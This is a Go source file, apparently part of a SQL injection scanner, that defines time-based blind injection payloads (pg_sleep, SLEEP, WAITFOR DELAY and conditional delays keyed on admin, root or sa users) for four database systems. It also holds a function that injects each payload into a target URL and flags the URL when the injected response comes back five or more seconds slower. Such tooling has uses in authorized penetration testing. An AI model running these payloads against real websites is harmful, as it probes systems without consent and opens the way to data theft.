package blind

import (
	"GoInjection/backend/helper"
	"GoInjection/backend/query"
	"GoInjection/backend/structs"
	"fmt"
	"strconv"
	"strings"
	"time"
)

var timePayloads = map[string][]string{
	"PostgresSQL": {
		"SELECT pg_sleep(5);", // Delay for 5 seconds
		"SELECT pg_sleep(0);", // Minimum delay (0 seconds)
		"SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END;", // Conditional delay based on user
		"OR pg_sleep(5); --", // OR condition with delay in a string
		"DO $$ BEGIN IF (current_user = 'postgres') THEN pg_sleep(5); END IF; END $$;", // PL/pgSQL block with delay
	},
	"MySQL": {
		"SELECT SLEEP(5);", // Delay for 5 seconds
		"SELECT SLEEP(0);", // Minimum delay (0 seconds)
		"SELECT IF(user()='root', SLEEP(5), SLEEP(0));", // Conditional delay based on user
		"OR SLEEP(5); --", // OR condition with delay in a string
		"DO SLEEP(5);",    // Delay in DO statement
	},
	"MsSQL": {
		"WAITFOR DELAY '00:00:05';",                       // Delay for 5 seconds
		"WAITFOR DELAY '00:00:00';",                       // Minimum delay (0 seconds)
		"IF SYSTEM_USER = 'sa' WAITFOR DELAY '00:00:05';", // Conditional delay based on system user
		"OR WAITFOR DELAY '00:00:05'; --",                 // OR condition with delay in a string
		"BEGIN WAITFOR DELAY '00:00:05'; END;",            // BEGIN...END block with delay
	},
	"SQLite": {
		"SELECT sleep(5);", // Delay for 5 seconds
		"SELECT sleep(0);", // Minimum delay (0 seconds)
		"SELECT CASE WHEN (user = 'admin') THEN sleep(5) ELSE sleep(0) END;", // Conditional delay based on user
		"OR sleep(5); --",             // OR condition with delay in a string
		"PRAGMA busy_timeout = 5000;", // Set timeout for 5 seconds
	},
}

func TimeBasedInjection(url string) (bool, string) {
	cleanedURLs, err := helper.GetUrls(url)
	helper.LogError(err)

	q := query.Query{DBMS: structs.TargetSyntax}
	for _, cleanedURL := range cleanedURLs {
		if payloads, ok := timePayloads[structs.TargetSyntax]; ok {
			for _, payload := range payloads {
				payloads, status := q.Build(payload)
				if status != "Success" {
					return false, fmt.Sprintf("Error generating payloads: %s", status)
				}

				for _, payload = range payloads {
					start1 := time.Now()
					_, _ = helper.SendRequest(structs.TargetURL)
					structs.TimeLinks++
					normalResponseTime := time.Since(start1)

					start2 := time.Now()
					_, _ = helper.SendRequest(strings.ReplaceAll(cleanedURL, helper.PayloadReplaceString, helper.URLEncodeQuery(payload)))
					structs.TimeLinks++
					injectedResponseTime := time.Since(start2)

					if injectedResponseTime.Seconds()-normalResponseTime.Seconds() >= 5 {
						helper.LogLine("Normal response time: " + strconv.Itoa(int(normalResponseTime.Seconds())))
						helper.LogLine("Injected response time: " + strconv.Itoa(int(injectedResponseTime.Seconds())))
						helper.LogLine("Difference: " + strconv.Itoa(int(injectedResponseTime.Seconds()-normalResponseTime.Seconds())))

						structs.TargetTime = true
						return true, payload
					}
				}
			}
		}
	}

	return false, "No Time-based injection detected."
}
